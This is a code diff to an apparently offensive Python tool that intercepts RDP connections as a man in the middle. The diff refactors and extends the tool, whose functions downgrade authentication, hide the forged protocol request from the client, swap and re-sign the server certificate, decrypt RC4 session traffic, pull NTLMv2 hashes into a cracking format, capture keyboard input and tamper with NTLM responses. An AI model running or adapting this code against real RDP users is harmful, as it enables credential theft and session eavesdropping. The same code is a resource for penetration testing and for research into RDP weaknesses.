@@ -84,6 +84,8 @@ SCANCODE = {
     "Del",
 }
 
+crypto = {}
+
 class RC4(object):
     def __init__(self, key):
         x = 0
@@ -109,7 +111,7 @@ class RC4(object):
 
 
     def update_key(self):
-        print("Updating session keys...")
+        print("Updating session keys")
         pad1 = b"\x36"*40
         pad2 = b"\x5c"*48
         # TODO finish this
@@ -135,9 +137,7 @@ def extract_ntlmv2(bytes, m):
         thisoffset = offset - 12 + field_offsets[i]
         values[keys[i]] = bytes[thisoffset:thisoffset+length]
 
-    # TODO check if LM struct is more than just zeros, maybe they're using
-    # lmchallenge which is broken
-
+    global nt_response
     nt_response = values["ntstruct"][:16]
     jtr_string = values["ntstruct"][16:]
 
@@ -166,10 +166,9 @@ def extract_server_cert(bytes):
     m2 = re.match(b".*010c.*030c.*020c", hexlify(bytes))
     offset = len(m2.group())//2
     size = struct.unpack('<H', substr(bytes, offset, 2))[0]
-    encryption_method = struct.unpack('<I', substr(bytes, offset+2, 4))[0]
-    encryption_level = struct.unpack('<I', substr(bytes, offset+6, 4))[0]
-    server_random_len = struct.unpack('<I', substr(bytes, offset+10, 4))[0]
-    server_cert_len = struct.unpack('<I', substr(bytes, offset+14, 4))[0]
+    encryption_method, encryption_level, server_random_len, server_cert_len = (
+        struct.unpack('<IIII', substr(bytes, offset+2, 16))
+    )
     server_random = substr(bytes, offset+18, server_random_len)
     server_cert = substr(bytes, offset+18+server_random_len,
                          server_cert_len)
@@ -179,12 +178,10 @@ def extract_server_cert(bytes):
         # 2 = x509
         # TODO ignore right most bit
 
-    dwVersion = struct.unpack('<I', substr(server_cert, 0, 4))[0]
-    dwSigAlg = struct.unpack('<I', substr(server_cert, 4, 4))[0]
-    dwKeyAlg = struct.unpack('<I', substr(server_cert, 8, 4))[0]
+    dwVersion, dwSigAlg, dwKeyAlg = struct.unpack('<III',
+                                                  substr(server_cert, 0, 12))
 
-    pubkey_type = struct.unpack('<H', substr(server_cert, 12, 2))[0]
-    pubkey_len = struct.unpack('<H', substr(server_cert, 14, 2))[0]
+    pubkey_type, pubkey_len = struct.unpack('<HH', substr(server_cert, 12, 4))
     pubkey = substr(server_cert, 16, pubkey_len)
     assert pubkey[:4] == b"RSA1"
 
@@ -192,11 +189,9 @@ def extract_server_cert(bytes):
     sign_len = struct.unpack('<H', substr(server_cert, 18+pubkey_len, 2))[0]
     sign = substr(server_cert, 20+pubkey_len, sign_len)
 
-    key_len = struct.unpack('<I', substr(pubkey, 4, 4))[0]
-    bit_len = struct.unpack('<I', substr(pubkey, 8, 4))[0]
+    key_len, bit_len = struct.unpack('<II', substr(pubkey, 4, 8))
     assert bit_len == key_len * 8 - 64
-    data_len = struct.unpack('<I', substr(pubkey, 12, 4))[0]
-    pub_exp = struct.unpack('<I', substr(pubkey, 16, 4))[0]
+    data_len, pub_exp = struct.unpack('<II', substr(pubkey, 12, 8))
     modulus = substr(pubkey, 20, key_len)
 
     first5fields = struct.pack("<IIIHH",
@@ -206,7 +201,7 @@ def extract_server_cert(bytes):
                     pubkey_type,
                     pubkey_len )
     global crypto
-    crypto = {"modulus": modulus,
+    crypto.update({"modulus": modulus,
              "pub_exponent": pub_exp,
              "data_len": data_len,
              "server_rand": server_random, # little endian
@@ -214,7 +209,7 @@ def extract_server_cert(bytes):
              "first5fields": first5fields,
              "pubkey_blob": pubkey,
              "client_rand": b"",
-    }
+    })
     crypto["pubkey"] = {
         "modulus": int.from_bytes(modulus, "little"),
         "publicExponent": pub_exp,
@@ -349,8 +344,10 @@ def decrypt(bytes, From="Client"):
 
 def sym_encryption_enabled():
     global crypto
-    return ("crypto" in globals() and
-            not crypto["client_rand"] == b"")
+    if "client_rand" in crypto:
+        return (not crypto["client_rand"] == b"")
+    else:
+        return False
 
 
 def generate_session_keys():
@@ -443,7 +440,6 @@ def extract_keyboard_layout(bytes, m):
     length = struct.unpack('<H', unhexlify(m.groups()[0]))[0]
     offset = len(m.group())//2 - length + 8
     global keyboard_info
-    #  try:
     keyboard_info = {
         "layout": struct.unpack("<I", substr(bytes, offset, 4))[0],
         "type": struct.unpack("<I", substr(bytes, offset+4, 4))[0],
@@ -455,8 +451,6 @@ def extract_keyboard_layout(bytes, m):
         keyboard_info["type"],
         keyboard_info["subtype"],
     )
-    #  except:
-    #      return b""
 
 
 def translate_keycode(key):
@@ -503,10 +497,10 @@ def replace_server_cert(bytes):
     return result
 
 
-def sign_certificate(bytes):
-    """Signs the public key with the private key"""
+def sign_certificate(cert):
+    """Signs the certificate with the private key"""
     m = hashlib.md5()
-    m.update(bytes)
+    m.update(cert)
     m = m.digest() + b"\x00" + b"\xff"*45 + b"\x01"
     m = int.from_bytes(m, "little")
     d = int.from_bytes(TERM_PRIV_KEY["d"], "little")
@@ -527,12 +521,14 @@ def parse_rdp(bytes, From="Client"):
                 length = struct.unpack('>H', bytes[1:3])[0]
                 length -= 0x80*0x100
             parse_rdp_packet(bytes[:length], From=From)
-            parse_rdp(bytes[length:], From=From)
+            if length > 0:
+                parse_rdp(bytes[length:], From=From)
 
 
 def parse_rdp_packet(bytes, From="Client"):
 
     if len(bytes) < 4: return b""
+
     if sym_encryption_enabled():
         bytes = decrypt(bytes, From=From)
     #  hexdump(bytes)
@@ -562,7 +558,7 @@ def parse_rdp_packet(bytes, From="Client"):
         result = extract_ntlmv2(bytes, m)
 
     global crypto
-    if "crypto" in globals():
+    if "client_rand" in crypto:
         regex = b".{14,}01.*0{16}"
         m = re.match(regex, hexlify(bytes))
         if m and crypto["client_rand"] == b"":
@@ -591,7 +587,7 @@ def tamper_data(bytes, From="Client"):
     result = bytes
 
     global crypto
-    if "crypto" in globals():
+    if "client_rand" in crypto:
         regex = b".{14,}01.*0{16}"
         m = re.match(regex, hexlify(bytes))
         if m and not crypto["client_rand"] == b"":
@@ -606,6 +602,19 @@ def tamper_data(bytes, From="Client"):
     m = re.match(regex, hexlify(bytes))
     if m:
         result = set_fake_requested_protocol(bytes, m)
+
+
+    global nt_response
+    if "nt_response" in globals():
+        global RDP_PROTOCOL
+        regex = b".*%s0003000000.*%s" % (
+            hexlify(b"NTLMSSP"),
+            hexlify(nt_response)
+        )
+        m = re.match(regex, hexlify(bytes))
+        if m and RDP_PROTOCOL > 2:
+            #  result = tamper_nt_response(bytes)
+            pass
 
     global server_challenge
     if (From == "Server"
@@ -625,8 +634,16 @@ def tamper_data(bytes, From="Client"):
     return result
 
 
+def tamper_nt_response(data):
+    """The connection is sometimes terminated if NTLM is successful"""
+    print("Tamper with NTLM response")
+    global nt_response
+    fake_response = bytes([(nt_response[0] + 1 ) % 0xFF]) + nt_response[1:]
+    return data.replace(nt_response, fake_response)
+
+
 def set_fake_requested_protocol(data, m):
-    print("Hiding forged protocol request from client...")
+    print("Hiding forged protocol request from client")
     offset = len(m.group())//2
     result = data[:offset+6] + bytes([RDP_PROTOCOL_OLD]) + data[offset+7:]
     return result
@@ -651,7 +668,7 @@ def downgrade_auth(bytes):
     # 2: CredSSP (NTLMv2 or Kerberos)
     # 8: CredSSP + Early User Authorization
     if m and RDP_PROTOCOL > args.downgrade:
-        print("Downgrading authentication options from %d to %d..." %
+        print("Downgrading authentication options from %d to %d" %
               (RDP_PROTOCOL, args.downgrade))
         RDP_PROTOCOL = args.downgrade
         result = (
@@ -714,13 +731,13 @@ def forward_data():
     readable, _, _ = select.select([local_conn, remote_socket], [], [])
     for s_in in readable:
         if s_in == local_conn:
-            From="Client"
+            From = "Client"
             to_socket = remote_socket
         elif s_in == remote_socket:
-            From="Server"
+            From = "Server"
             to_socket = local_conn
         data = s_in.recv(4096)
-        if len(data)==4096:
+        if len(data) == 4096:
             while len(data)%4096 == 0:
                 data += s_in.recv(4096)
         if data == b"": return close()
@@ -742,32 +759,12 @@ def open_sockets():
     remote_socket.connect((args.target_host, args.target_port))
 
 
-def clear_globals():
-    global crypto
-    global server_challenge
-    global keyboard_info
-    global RC4_SBOX_CLIENT
-    global RC4_SBOX_SERVER
-    global downgrade_credssp
-    global RDP_PROTOCOL
-    global RDP_PROTOCOL_OLD
-    if "crypto" in globals(): del crypto
-    if "server_challenge" in globals(): del server_challenge
-    if "keyboard_info" in globals(): del keyboard_info
-    if "RC4_SBOX_CLIENT" in globals(): del RC4_SBOX_CLIENT
-    if "RC4_SBOX_SERVER" in globals(): del RC4_SBOX_SERVER
-    if "downgrade_credssp" in globals(): del downgrade_credssp
-    if "RDP_PROTOCOL" in globals(): del RDP_PROTOCOL
-    if "RDP_PROTOCOL_OLD" in globals(): del RDP_PROTOCOL
-
 def run():
     open_sockets()
     handle_protocol_negotiation()
-    global RDP_PROTOCOL
     if not RDP_PROTOCOL == 0:
         enableSSL()
     while True:
-        #  clear_globals()
         try:
             if not forward_data():
                 break
